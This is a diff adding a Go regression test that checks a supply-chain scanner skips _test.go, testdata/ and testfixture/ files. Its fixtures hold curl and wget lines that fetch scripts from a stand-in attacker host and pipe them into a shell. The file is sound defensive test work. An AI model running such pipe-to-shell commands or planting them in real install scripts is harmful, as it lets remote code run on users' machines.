@@ -221,6 +221,33 @@ func TestRunSupplyChain_Typosquat(t *testing.T) {
 	}
 }
 
+// Regression: scanner was flagging _test.go and testdata/ files, causing false positives.
+func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
+	repo := &fetch.Repo{
+		Files: map[string][]byte{
+			// _test.go file with a dangerous pattern — should be skipped
+			"install_test.go": []byte("curl https://evil.example.com/setup.sh | bash"),
+			// testdata/ file with a dangerous pattern — should be skipped
+			"testdata/evil.sh": []byte("curl https://evil.example.com/setup.sh | bash"),
+			// testfixture/ file with a dangerous pattern — should be skipped
+			"testfixture/payload.sh": []byte("wget https://evil.example.com/run.sh | sh"),
+		},
+	}
+
+	out := make(chan scan.Finding, 100)
+	Run(context.Background(), repo, scan.Options{}, out)
+	close(out)
+
+	var findings []scan.Finding
+	for f := range out {
+		findings = append(findings, f)
+	}
+
+	if len(findings) != 0 {
+		t.Errorf("expected zero findings for test files, got %d: %v", len(findings), findings)
+	}
+}
+
 func TestRunSupplyChain_NoFalsePositiveOnCleanFile(t *testing.T) {
 	repo := &fetch.Repo{
 		Files: map[string][]byte{
